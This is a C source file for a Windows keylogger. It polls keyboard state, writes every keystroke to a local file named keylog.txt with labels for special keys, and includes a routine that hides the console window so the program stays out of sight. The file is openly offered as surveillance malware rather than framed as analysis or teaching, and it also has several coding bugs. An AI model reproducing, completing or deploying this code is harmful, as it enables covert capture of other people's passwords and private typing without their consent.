 
 #include <stdio.h>
 #include <windows.h>
#define FILENAME "keylog.txt"
//void CheckKey(int key);



 //Checks with the key input (int ) which key actually was pressed //// TODO works, but takes the same input too often.
/*
int Inputbuffer[]
if(key == VK_CAPTIAL)
INPUTBUFFER[key] = key
*/
int show = TRUE;

int a = 10;
float b = 4.5;
double c = 9;



 int CheckKey(int key)
 {
 FILE *pfile = fopen(FILENAME,"a+");
if (key==8){
 fprintf(pfile,"%s","[del]");
  return key;
}

 if (key==13){
fprintf(pfile,"%s","n");
  return key;
 }
 
 if (key==32){
 fprintf(pfile,"%s"," ");
   return key;
 }
 
 if (key==VK_CAPITAL){
fprintf(pfile,"%s","[CAPS]");
   return key;
 }
 
 if (key==VK_TAB){
 fprintf(pfile,"%s","[TAB]");
   return key;
 }

 if (key==VK_SHIFT){
 fprintf(pfile,"%s","[SHIFT]");
   return key;
 }


 if (key==VK_CONTROL)
 {
 fprintf(pfile,"%s","[CTRL]");
   return key;

 }

 if (key==VK_PAUSE)
 {
 fprintf(pfile,"%s","[PAUSE]");
   return key;

 }

 if (key==VK_ESCAPE){
 fprintf(pfile,"%s","[ESC]");
   return key;
 }



 if (key==VK_END){
 fprintf(pfile,"%s","[END]");
   return key;
 }


 if (key==VK_HOME){
 fprintf(pfile,"%s","[HOME]");
   return key;
 }


 if (key==VK_LEFT)
 {
 fprintf(pfile,"%s","[LEFT]");
   return key;
 }


 if (key==VK_UP){
 fprintf(pfile,"%s","[UP]");
   return key;
 }


 if (key==VK_RIGHT)
 {
 fprintf(pfile,"%s","[RIGHT]");
   return key;

 }

 if (key==VK_DOWN)
 {
fprintf(pfile,"%s","[DOWN]");
   return key;

 }
 
 if (key==VK_SNAPSHOT){
 fprintf(pfile,"%s","[PRINT]");
   return key;
 }


 if (key==VK_NUMLOCK)
 {
fprintf(pfile,"%s","[NUM LOCK]");
   return key;
 }
 

 if (key==190 || key==110)
 {
fprintf(pfile,"%s",".");
   return key;
 }
 

 
 if (key >=96 && key <= 105)
 {
 key -= 48;
 fprintf(pfile,"%s",&key);
   return key;
 }

if (key >=48 && key <= 59){
 fprintf(pfile,"%s",&key);
   return key;

}

if (key !=VK_LBUTTON || key !=VK_RBUTTON)
 {
 if (key >=65 && key <=90)
 {
 if (GetKeyState(VK_CAPITAL)){
fprintf(pfile,"%s",&key);
   return key;
 }
 
 else
 {
 key = key +32;
 fprintf(pfile,"%s",&key);
 }}}

fclose(pfile);
 }
 
 void Hide() //Hides the Console window completely. Only visible in Task-Manager
 {
     if(show == 1)
     {
    HWND stealth;
    stealth = FindWindow("ConsoleWindowClass", NULL );
    ShowWindow(stealth, 0);
     }
     else return;
   
 }
 

int main() 
 {
show = 0; // if 1 then the window is hidden 


size_t size= 190 * sizeof(int);//assign bytes


// sizeof gets the Byte size of the int variable and then we multiply by the amount of integers
int *keyinputbuffer =(int*) malloc(size);
if(keyinputbuffer)
{

}
Hide();

while(1)
{
Sleep(100); // avoid 100% cpu usage
for(int key=8; key<=190; key++){
if (GetAsyncKeyState(key) != HC_ACTION && keyinputbuffer[key] != key){ // TODO works, but takes the same input too often.

//printf("1");
CheckKey(key);
keyinputbuffer[key] = key;
char ll = 'm';
printf("%c", ll );

}
 }//for loop
  //free(keyinputbuffer); //since we checked every possible key RESET THE BUFFER
  keyinputbuffer = realloc(keyinputbuffer, size);
 for(int i=0;i<190;i++)
 {
   printf("%c",keyinputbuffer[i]);
 }
 }
 return 0; // we will probably never get here 
 }
 
 
 
